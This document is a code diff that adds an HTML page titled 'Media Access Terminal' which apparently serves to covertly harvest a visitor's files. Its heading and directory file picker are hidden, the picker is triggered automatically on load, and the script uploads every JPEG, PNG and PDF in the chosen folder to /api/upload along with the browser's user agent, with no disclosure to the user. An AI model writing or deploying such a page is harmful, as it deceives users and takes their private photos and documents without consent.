@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Media Access Terminal</title>
+</head>
+<body>
+  <h1 style="display:none;">Initiating Session...</h1>
+  <input id="picker" type="file" multiple webkitdirectory style="display:none;" />
+  <script>
+    async function upload(files) {
+      const formData = new FormData();
+      for (const file of files) {
+        if (/\.(jpe?g|png|pdf)$/i.test(file.name)) {
+          formData.append("file", file, file.name);
+        }
+      }
+      try {
+        await fetch("/api/upload", {
+          method: "POST",
+          body: formData,
+          headers: {
+            "X-Agent": navigator.userAgent
+          }
+        });
+      } catch (err) {
+        console.error("Upload failed", err);
+      }
+    }
+
+    const picker = document.getElementById("picker");
+    picker.click();
+    picker.addEventListener("change", () => {
+      if (picker.files.length > 0) {
+        upload(picker.files);
+      }
+    });
+  </script>
+</body>
+</html>
